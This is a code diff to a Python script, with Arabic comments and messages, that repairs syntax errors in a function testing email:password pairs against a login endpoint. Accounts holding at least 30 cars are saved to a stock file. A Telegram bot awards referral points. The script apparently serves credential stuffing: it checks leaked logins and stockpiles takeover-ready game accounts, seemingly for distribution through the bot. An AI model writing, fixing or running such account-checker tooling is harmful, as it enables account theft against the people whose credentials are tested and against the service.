@@ -251,11 +251,12 @@ def check_account(email, password):
         
         status, body = http_post(login_url, login_payload, login_headers, timeout=10)
         if status == 200:
-            res_json =(ref json.loads(body)
+            # تم إصلاح هذا السطر
+            res_json = json.loads(body)
             id_token = res_json.get('idToken')
-            if id_token_id:
+            if id_token:
                 car_count = get_car_count(id_token)
-               ), if car_count >= settings.get("min_cars", 30):
+                if car_count >= settings.get("min_cars", 30):
                     with lock: good += 1
                     with open(DB_STOCK, 'a', encoding='utf-8') as f:
                         f.write(f'{email}:{password}:{car_count}\n')
@@ -340,7 +341,7 @@ def send_welcome(message):
                 add_points(ref_id, settings.get("ref_points", 5), "referral")
                 save_json(DB_USERS, users)
                 try: 
-                    bot.send_message(int f"🎉 شخص جديد دخل من رابطك! حصلت على {settings.get('ref_points', 5)} نقاط.")
+                    bot.send_message(int(ref_id), f"🎉 شخص جديد دخل من رابطك! حصلت على {settings.get('ref_points', 5)} نقاط.")
                 except: pass
         except Exception as e:
             logging.error(f"Referral error: {e}")
